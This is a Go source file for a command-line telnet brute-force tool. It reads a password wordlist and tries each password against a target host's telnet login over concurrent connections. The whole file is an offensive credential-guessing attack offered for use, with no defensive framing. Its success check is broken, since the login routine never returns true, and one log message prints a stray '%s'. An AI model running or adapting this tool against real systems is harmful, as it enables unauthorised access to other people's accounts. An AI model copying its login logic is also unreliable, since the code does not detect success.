package main

import (
	"bufio"
	"flag"
	"fmt"
	"net"
	"os"
	"sync"
	"time"
)

// ** GLOBALS ** //
var verbose bool

func verbPrint(toPrint string) {
	if verbose {
		fmt.Println("     ! " + toPrint)
	}
}

func main() {
	// flags setup!
	var targetIp string
	var targetPort string
	var username string
	var passwordsFile string
	var numThreads int
	var verboseFlag bool

	flag.StringVar(&targetIp, "target", "", "The host which is running a brute-forcable telnet instance. [REQUIRED]")
	flag.StringVar(&targetIp, "t", "", "The host which is running a brute-forcable telnet instance. [REQUIRED]")
	flag.StringVar(&targetPort, "port", "23", "Port which is running telnet instance. (default: 23)")
	flag.StringVar(&targetPort, "pn", "23", "Port which is running telnet instance. (default: 23)")
	flag.StringVar(&username, "user", "", "Username for brute force attempting. (to implement: allow wordlist!) [REQUIRED]")
	flag.StringVar(&username, "u", "", "Username for brute force attempting. (to implement: allow wordlist!) [REQUIRED]")
	flag.IntVar(&numThreads, "conn", 8, "Concurrent threads allowed.")
	flag.IntVar(&numThreads, "c", 8, "Concurrent threads allowed.")
	flag.StringVar(&passwordsFile, "passwordsFile", "", "File location of a newline sperated password-candidate list. [REQUIRED]")
	flag.StringVar(&passwordsFile, "p", "", "File location of a newline sperated password-candidate list. [REQUIRED]")
	flag.BoolVar(&verboseFlag, "verbose", false, "Enable more verbose output.")
	flag.BoolVar(&verboseFlag, "v", false, "Enable more verbose output.")

	flag.Usage = func() {
		fmt.Printf("Usage of %s:\n", os.Args[0])

		//flag.PrintDefaults()
		flagSet := flag.CommandLine
		order := [][]string{
			[]string{"", "Required:"},
			[]string{"target", "t"},
			[]string{"user", "u"},
			[]string{"passwordsFile", "p"},
			[]string{"", "Optionals:"},
			[]string{"port", "pn"},
			[]string{"conn", "c"},
			[]string{"verbose", "v"}}

		for _, set := range order {
			if set[0] == "" {
				fmt.Println("\n  " + set[1])
				continue
			}
			flag := flagSet.Lookup(set[0])
			fmt.Println("    --" + set[0] + " (-" + set[1] + ")  ->  " + flag.Usage)
		}
	}

	flag.Parse()

	if verboseFlag {
		verbose = true
	} else {
		verbose = false
	}

	passwords, err := readPasswords(passwordsFile)
	if err != nil {
		fmt.Println("Error reading passwords file:", err)
		return
	}

	wg := new(sync.WaitGroup)
	sem := make(chan struct{}, numThreads)

	wg.Add(len(passwords))

	verbPrint("Brute-forcing telnet login for username: %s" + username + "\n\n")

	for _, password := range passwords {
		go func(password string) {
			defer wg.Done()
			sem <- struct{}{}
			if attemptLogin(username, password, targetIp, targetPort) {
				fmt.Println("")
				fmt.Printf("[+] Password found: %s\n", password)
				os.Exit(0) // we found it, get the heck outta here!
			} else {
				fmt.Print("* ")
				verbPrint("Attempted: " + password)
			}
			<-sem
		}(password)
	}

	wg.Wait()

	fmt.Println("All password attempts finished.")
	os.Exit(0)
}

// attemptLogin tries to log in with the provided username and password.
// Returns true if login successful, false otherwise.
func attemptLogin(username, password string, theIp string, thePort string) bool {
	conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%s", theIp, thePort), 5*time.Second)
	if err != nil {
		fmt.Printf("!")
		verbPrint(err.Error())
		return false
	}

	gotToColon := false

	sentUser := false
	sentPass := false

	scanner := bufio.NewScanner(conn)
	scanner.Split(bufio.ScanRunes)
	for scanner.Scan() {
		if scanner.Text() == ":" {
			gotToColon = true
			if sentUser && sentPass {
				conn.Close()
				return false
			}
		} else if scanner.Text() == " " && gotToColon {
			if sentUser == false {
				conn.Write([]byte(username))
				conn.Write([]byte("\r\n"))
				sentUser = true
				gotToColon = false
			} else if sentUser == true && sentPass == false {
				conn.Write([]byte(password))
				conn.Write([]byte("\r\n"))
				sentPass = true
				gotToColon = false
			}
		}
	}
	fmt.Print("!! ")
	verbPrint("Something has gone wrong with our telnet interaction... it closed before I sent username and password!")
	return false
}

func readPasswords(filename string) ([]string, error) {
	file, err := os.Open(filename)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var passwords []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		passwords = append(passwords, scanner.Text())
	}
	return passwords, scanner.Err()
}
